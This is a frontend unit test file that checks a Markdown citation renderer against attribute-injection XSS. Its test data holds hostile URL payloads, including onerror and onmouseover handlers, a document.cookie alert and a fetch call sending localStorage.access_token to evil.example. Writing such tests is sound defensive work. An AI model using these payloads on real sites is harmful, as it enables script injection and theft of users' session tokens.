// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { mount } from "@vue/test-utils";

import { i18n } from "@/i18n";
import MarkdownView from "./MarkdownView.vue";
import type { CitationGround, SourcePreview } from "@/lib/types";

function render(
  source: string,
  sources?: SourcePreview[],
  extra: { grounding?: CitationGround[]; verify?: boolean } = {},
) {
  return mount(MarkdownView, { props: { source, sources, ...extra }, global: { plugins: [i18n] } });
}

function citationHrefs(wrapper: ReturnType<typeof render>): Record<string, string | null> {
  const out: Record<string, string | null> = {};
  for (const el of wrapper.findAll(".md-citation")) out[el.text()] = el.attributes("href") ?? null;
  return out;
}

// Every event-handler attribute (onerror, onmouseover, …) anywhere in the rendered DOM.
function eventHandlers(wrapper: ReturnType<typeof render>): string[] {
  const root = wrapper.element as Element;
  return Array.from(root.querySelectorAll<Element>("*")).flatMap((el) =>
    Array.from(el.attributes)
      .filter((a) => /^on/i.test(a.name))
      .map((a) => `${el.tagName.toLowerCase()}[${a.name}]`),
  );
}

describe("MarkdownView citations", () => {
  it("links [Sn] to the explicit source map and percent-encodes attribute-breaking URLs", () => {
    const wrapper = render("Claim one [S1]. Claim two [S2].", [
      { source_id: "S1", url: "https://one.example/a" },
      { source_id: "S2", url: 'https://two.example/"onmouseover="x' },
    ]);

    const links = wrapper.findAll("a.md-citation");
    expect(links).toHaveLength(2);
    expect(links[0].attributes()).toMatchObject({
      href: "https://one.example/a",
      target: "_blank",
      rel: "noopener noreferrer",
    });
    // The quote is percent-encoded inside href — no injected event-handler attribute.
    expect(links[1].attributes("href")).toBe("https://two.example/%22onmouseover=%22x");
    expect(eventHandlers(wrapper)).toEqual([]);
  });

  it("renders a citation without a known URL as plain text, never as a link", () => {
    const wrapper = render("Unbacked claim [S7].", [{ source_id: "S7", url: "javascript:alert(1)" }]);

    expect(wrapper.find("a.md-citation").exists()).toBe(false);
    expect(wrapper.find("sup.md-citation").text()).toBe("[S7]");
  });

  it("falls back to the report's Sources section for older reports without a map", () => {
    const wrapper = render("Claim [S3].\n\n## Sources\n\n- [S3] Example — https://legacy.example/page");

    expect(citationHrefs(wrapper)).toEqual({ "[S3]": "https://legacy.example/page" });
  });

  it("keeps the explicit map authoritative; report lines only fill missing ids", () => {
    // A body sentence that cites [S1] next to an unrelated URL must not re-point S1.
    const wrapper = render(
      "Per the vendor blog (https://vendor.example/post) the figure grew [S1].\n\n" +
        "## Sources\n\n- [S1] Official stats — https://stale.example/old\n- [S2] Extra — https://two.example/b",
      [{ source_id: "S1", url: "https://stats.example/table" }],
    );

    expect(citationHrefs(wrapper)).toMatchObject({
      "[S1]": "https://stats.example/table",
      "[S2]": "https://two.example/b",
    });
  });

  // [Sn] inside an attribute value (image alt, link title) must stay plain text: turning it
  // into <a href="…"> there closes the attribute and lets the URL add event handlers.
  const EVIL_TEXT_URL = "https://x.example/p/onerror=alert`1`//";
  const EVIL_EXPLICIT_URL = "https://evil.example/p/onerror=fetch('//evil.example/'+localStorage.access_token)//";

  it.each<[string, string, SourcePreview[] | undefined]>([
    ["image alt, URL from the report text", `- [S9] (${EVIL_TEXT_URL})\n\nIntro ![[S9]](https://nope.invalid/a.png)`, undefined],
    [
      "link title, URL from the report text",
      '[S4] https://x.example/p/onmouseover=alert`document.cookie`//\n\nRead [more](https://ok.example "[S4]").',
      undefined,
    ],
    ["link title, explicit source URL", 'See [here](https://ok.example "[S1]") now.', [{ source_id: "S1", url: EVIL_EXPLICIT_URL }]],
    ["image alt, explicit source URL", "Chart ![[S1]](https://nope.invalid/a.png)", [{ source_id: "S1", url: EVIL_EXPLICIT_URL }]],
  ])("never rewrites a citation inside an attribute (%s)", (_name, source, sources) => {
    const wrapper = render(source, sources);

    expect(eventHandlers(wrapper)).toEqual([]);
    const img = wrapper.find("img");
    if (img.exists()) expect(img.attributes("alt")).toMatch(/^\[S\d\]$/);
    const titled = wrapper.find("a[title]");
    if (titled.exists()) expect(titled.attributes("title")).toMatch(/^\[S\d\]$/);
  });

  it("keeps attributes intact in verify mode and with a grounding URL", () => {
    const wrapper = render(
      "Intro text here ![[S2]. Next claim](https://nope.invalid/a.png) and more [S2]. Another [S2].",
      undefined,
      {
        verify: true,
        grounding: [{ source_id: "S2", url: EVIL_EXPLICIT_URL, title: "t", quote: "q", supported: true }],
      },
    );

    expect(eventHandlers(wrapper)).toEqual([]);
    // Neither a citation link nor a claim-band span lands inside the alt text.
    expect(wrapper.find("img").attributes("alt")).toBe("[S2]. Next claim");
    // Body citations still link, to the percent-encoded grounding URL.
    expect(wrapper.find("a.md-citation").attributes("href")).toBe(
      "https://evil.example/p/onerror=fetch(%27//evil.example/%27+localStorage.access_token)//",
    );
    expect(wrapper.findAll(".md-claim").length).toBeGreaterThan(0);
  });

  // Rows of cell texts (th/td), with the verify-mode support badges left out.
  function tableCells(wrapper: ReturnType<typeof render>): string[][] {
    return wrapper.findAll("tr").map((tr) =>
      tr.findAll("th, td").map((cell) => {
        const copy = cell.element.cloneNode(true) as Element;
        copy.querySelectorAll(".md-claim-badge").forEach((b) => b.remove());
        return (copy.textContent || "").trim();
      }),
    );
  }

  it.each<[string, string]>([
    [
      "outer pipes",
      "| Metric | Value | Source |\n|---|---|---|\n| Revenue grew | $5B in 2024 [S1] | [S1] |\n| Users | 10M. Up 5% [S2] | [S2] |",
    ],
    [
      "no outer pipes",
      "Metric | Value | Source\n--- | --- | ---\nRevenue grew | $5B in 2024 [S1] | [S1]\nUsers | 10M. Up 5% [S2] | [S2]",
    ],
    [
      "inside a blockquote, escaped pipe",
      "> | Metric | Value | Source |\n> |---|---|---|\n> | Revenue grew | $5B \\| 2024 [S1] | [S1] |\n> | Users | 10M. Up 5% [S2] | [S2] |",
    ],
  ])("keeps a cited table's cells in verify mode (%s)", (_name, source) => {
    const sources = [
      { source_id: "S1", url: "https://one.example/a" },
      { source_id: "S2", url: "https://two.example/b" },
    ];
    const plain = tableCells(render(source, sources));
    const verified = render(source, sources, { verify: true });

    expect(plain).toHaveLength(3);
    expect(plain[1]).toHaveLength(3);
    expect(tableCells(verified)).toEqual(plain);
    // Each cited cell is its own claim: the band span sits inside the cell and holds the
    // cell's citation and its badge (a span crossing cells would be split by the parser).
    const claims = verified.findAll(".md-claim");
    expect(claims).toHaveLength(4);
    for (const claim of claims) {
      expect(claim.element.closest("td")).not.toBeNull();
      expect(claim.findAll(".md-citation")).toHaveLength(1);
      expect(claim.findAll(".md-claim-badge")).toHaveLength(1);
    }
    expect(verified.findAll("a.md-citation")).toHaveLength(4);
  });

  it("drops the link for a URL that does not parse as http(s)", () => {
    const wrapper = render("Claim [S1]. Other [S2].", [
      { source_id: "S1", url: "https://" },
      { source_id: "S2", url: "https://ok.example/a b" },
    ]);

    expect(citationHrefs(wrapper)).toEqual({ "[S1]": null, "[S2]": "https://ok.example/a%20b" });
  });
});
